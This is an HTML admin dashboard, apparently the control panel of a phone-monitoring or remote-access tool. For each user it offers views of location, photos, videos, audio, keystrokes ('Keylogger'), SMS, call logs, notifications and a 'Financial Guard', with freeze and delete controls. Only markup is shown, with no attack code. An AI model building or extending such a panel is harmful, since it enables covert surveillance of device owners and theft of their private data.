<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="robots" content="noindex">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Beta Dashboard</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="background-animation"></div>

    <div id="login-container">
        <div class="login-card">
            <h2>Admin Panel</h2>
            <input type="email" id="email" placeholder="Admin Email">
            <input type="password" id="password" placeholder="Password">
            <button id="login-btn">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>
                <span>Secure Login</span>
            </button>
            <p id="error-message"></p>
        </div>
    </div>

    <div id="dashboard" class="dashboard-container" style="display: none;">
        <aside class="sidebar">
            <div class="sidebar-header">
                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg>
                <h2 id="sidebar-title">Users</h2>
            </div>
            <input type="text" id="user-search-input" placeholder="üîç Search users..." style="width: calc(100% - 1rem); padding: 0.5rem; margin: 0.5rem; background: #1a1a1a; border: 1px solid #444; border-radius: 6px; color: #c9d1d9; font-size: 0.9rem;">
            <ul id="user-list" class="user-list"></ul>
        </aside>

        <main class="main-content">
            <header class="main-header">
                <div style="display: flex; align-items: center; gap: 1rem;">
                    <button id="toggle-sidebar-btn" class="header-btn">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><line x1="9" y1="3" x2="9" y2="21"></line></svg>
                    </button>
                    <button id="menu-btn" class="header-btn">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg>
                    </button>
                    <h1 id="main-content-title">Select a User</h1>
                </div>

                <div class="header-buttons">
                    <button id="alert-bell-btn" class="header-btn" title="View Critical Alerts" style="position: relative;">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
                    </button>
                    <button id="send-notification-btn">Send Notification</button>
                    <button id="send-to-all-btn">Send to All</button>
                    <button id="delete-user-btn">Delete User</button>
                    <button id="logout-btn">Logout</button>
                </div>
            </header>

            <!-- Details View Container (shown when user is selected) -->
            <div id="details-view" style="display: none;">
                <!-- Quick Actions Bar (shown when user is selected) -->
                <div id="quick-actions-bar" style="display: none; padding: 1rem; background: rgba(22, 27, 34, 0.5); border-bottom: 1px solid var(--border-color); display: flex; gap: 0.5rem; flex-wrap: wrap; align-items: center;">
                    <button id="open-media-limits-btn" style="padding: 8px 14px; background: var(--accent-green); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 500;">üìä Media Limits</button>
                    <button id="open-change-plan-btn" style="padding: 8px 14px; background: var(--accent-blue); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 500;">üìà Change Plan</button>
                    <button id="open-delete-device-btn" style="padding: 8px 14px; background: var(--accent-red); color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 500;">üóëÔ∏è Delete Device</button>
                    <button id="open-clear-chat-btn" style="padding: 8px 14px; background: #f39c12; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 0.9rem; font-weight: 500;">üí¨ Clear Chat</button>
                </div>
                <div class="category-buttons">
                    <button class="category-btn" data-category="devicestatus">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ce93d8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                        <span>Device Status</span>
                    </button>
                    <button class="category-btn" data-category="health">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#e57373" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
                        <span>Health & Logs</span>
                    </button>
                    <button class="category-btn" data-category="location">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>
                        <span>Location</span>
                    </button>
                    <button class="category-btn" data-category="photo">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
                        <span>Photos</span>
                    </button>
                    <button class="category-btn" data-category="video">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff7043" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>
                        <span>Videos</span>
                    </button>
                    <button class="category-btn" data-category="audio">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#26a69a" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v2a7 7 0 0 1-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>
                        <span>Audio</span>
                    </button>
                    <button class="category-btn" data-category="keylogger">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#f39c12" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M6 12h.01M10 12h.01M14 12h.01M18 12h.01M8 16h8"/></svg>
                        <span>Keylogger</span>
                    </button>
                    <button class="category-btn" data-category="sms">
                         <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#9b59b6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
                        <span>SMS</span>
                    </button>
                    <button class="category-btn" data-category="calllogs">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#64b5f6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81 .7A2 2 0 0 1 22 16.92z"></path></svg>
                        <span>Call Logs</span>
                    </button>
                    <button class="category-btn" data-category="notifications">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
                        <span>Notifications</span>
                    </button>
                    <button class="category-btn" data-category="chat">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-purple)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
                        <span>Live Chat</span>
                    </button>
                    <button class="category-btn" data-category="admin-vault">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff6b9d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="1"></circle><path d="M12 1v6m0 6v6M4.22 4.22l4.24 4.24m5.08 5.08l4.24 4.24M1 12h6m6 0h6M4.22 19.78l4.24-4.24m5.08-5.08l4.24-4.24"></path></svg>
                        <span>Financial Guard</span>
                    </button>
                    <button class="category-btn" data-category="critical-alerts">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff6b6b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3.05h16.94a2 2 0 0 0 1.71-3.05L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
                        <span>üö® Critical Alerts</span>
                    </button>
                    <button class="category-btn" data-category="freeze-status">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#00bcd4" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 0 0 0 20c3.313 0 6.247-1.525 8.156-4"></path><path d="M20.485 5.515l1.414-1.414M10 13H7m3-3V7"></path></svg>
                        <span>Freeze Control</span>
                    </button>
                    <button class="category-btn" data-category="audit-logs">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#4db8ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 3h18v18H3z"></path><path d="M3 9h18M9 3v18"></path><rect x="7" y="5" width="4" height="4"></rect><rect x="13" y="5" width="4" height="4"></rect></svg>
                        <span>Audit Logs</span>
                    </button>
                    <button class="category-btn" data-category="login-history">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#8b5cf6" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path><polyline points="17 21 17 13 7 13 7 21"></polyline><polyline points="7 3 7 8 15 8"></polyline></svg>
                        <span>Login History</span>
                    </button>
                    <button class="category-btn" data-category="limit-management">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#26d07c" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 12h18M3 12l3 3m15-3l-3 3M3 12l3-3m15 3l-3-3"></path><circle cx="12" cy="12" r="1"></circle></svg>
                        <span>Media Limits</span>
                    </button>
                </div>
            </div>
            </div>
        </main>
    </div>
    <div id="overlay"></div>

    <div id="data-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3 id="modal-title">Data</h3>
                <button class="modal-close-btn">√ó</button>
            </div>
            <div class="modal-body" id="modal-data-display-area"></div>
        </div>
    </div>

    <div id="notification-modal" class="modal-overlay">
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h3 id="notification-modal-title">Send Notification to User</h3>
                <button class="modal-close-btn">√ó</button>
            </div>
            <div class="modal-body">
                <textarea id="notification-message-input" rows="4" placeholder="Enter your message..."></textarea>
            </div>
            <div class="modal-footer">
                <button id="send-notification-submit-btn">Send</button>
            </div>
        </div>
    </div>

    <div id="delete-user-modal" class="modal-overlay">
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h3>Permanently Delete User</h3>
                <button class="modal-close-btn">√ó</button>
            </div>
            <div class="modal-body">
                <p id="delete-user-info" style="font-size: 1.1rem; line-height: 1.6; text-align: center; margin-bottom: 1rem;"></p>
                <p style="text-align: center; color: var(--text-secondary);">This action is irreversible and will delete all data associated with this user from the database.</p>
            </div>
            <div class="modal-footer">
                <button id="cancel-user-delete-btn" class="btn btn-secondary">Cancel</button>
                <button id="confirm-user-delete-btn" class="btn btn-danger">Yes, Delete User</button>
            </div>
        </div>
    </div>

    <div id="alerts-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3>üö® Critical Alerts</h3>
                <button class="modal-close-btn">√ó</button>
            </div>
            <div class="modal-body" id="alerts-display-area"></div>
        </div>
    </div>

    <div id="media-limits-modal" class="modal-overlay">
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h3>Media Limits Management</h3>
                <button class="modal-close-btn">√ó</button>
            </div>
            <div class="modal-body">
                <div style="margin-bottom: 1.5rem;">
                    <label style="display: block; margin-bottom: 0.5rem; color: var(--text-primary);">Photo Limit:</label>
                    <input type="number" id="photo-limit-input" placeholder="Enter photo limit (0 = unlimited)" min="0" style="width: 100%; padding: 10px; background-color: var(--secondary-dark); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-primary);">
                </div>
                <div style="margin-bottom: 1.5rem;">
                    <label style="display: block; margin-bottom: 0.5rem; color: var(--text-primary);">Video Limit:</label>
                    <input type="number" id="video-limit-input" placeholder="Enter video limit (0 = unlimited)" min="0" style="width: 100%; padding: 10px; background-color: var(--secondary-dark); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-primary);">
                </div>
                <div style="margin-bottom: 1.5rem;">
                    <label style="display: block; margin-bottom: 0.5rem; color: var(--text-primary);">Audio Limit:</label>
                    <input type="number" id="audio-limit-input" placeholder="Enter audio limit (0 = unlimited)" min="0" style="width: 100%; padding: 10px; background-color: var(--secondary-dark); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-primary);">
                </div>
            </div>
            <div class="modal-footer">
                <button id="update-limits-btn" class="btn" style="background: var(--accent-green); color: white; border: none; border-radius: 6px; padding: 10px 20px; cursor: pointer; font-weight: 500;">Update Limits</button>
            </div>
        </div>
    </div>

    <div id="delete-device-modal" class="modal-overlay">
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h3>Delete This Device</h3>
                <button class="modal-close-btn">√ó</button>
            </div>
            <div class="modal-body">
                <p id="delete-device-info" style="font-size: 1rem; line-height: 1.6; text-align: center; margin-bottom: 1rem;"></p>
                <p style="text-align: center; color: var(--text-secondary);">This action will delete this device only, not the user account.</p>
            </div>
            <div class="modal-footer">
                <button id="cancel-device-delete-btn" class="btn btn-secondary">Cancel</button>
                <button id="confirm-device-delete-btn" class="btn btn-danger">Yes, Delete Device</button>
            </div>
        </div>
    </div>

    <div id="change-plan-modal" class="modal-overlay">
        <div class="modal-content" style="max-width: 500px;">
            <div class="modal-header">
                <h3>Change User Plan</h3>
                <button class="modal-close-btn">√ó</button>
            </div>
            <div class="modal-body">
                <label style="display: block; margin-bottom: 0.5rem; color: var(--text-primary);">Select Plan:</label>
                <select id="plan-select" style="width: 100%; padding: 10px; background-color: var(--secondary-dark); border: 1px solid var(--border-color); border-radius: 6px; color: var(--text-primary); font-size: 1rem;">
                    <option value="">-- Choose a Plan --</option>
                    <option value="free">Free</option>
                    <option value="pro">Pro</option>
                    <option value="enterprise">Enterprise</option>
                </select>
            </div>
            <div class="modal-footer">
                <button id="change-plan-btn" class="btn" style="background: var(--accent-blue); color: white; border: none; border-radius: 6px; padding: 10px 20px; cursor: pointer; font-weight: 500;">Change Plan</button>
            </div>
        </div>
    </div>

    <div id="audit-logs-modal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-header">
                <h3>System Audit Logs</h3>
                <button class="modal-close-btn">√ó</button>
            </div>
            <div class="modal-body" id="audit-logs-table-area"></div>
        </div>
    </div>

    <!-- Toast Notification System -->
    <div id="toast-container" class="toast-container"></div>
    
    <script type="module" src="app.js"></script>
</body>
</html>
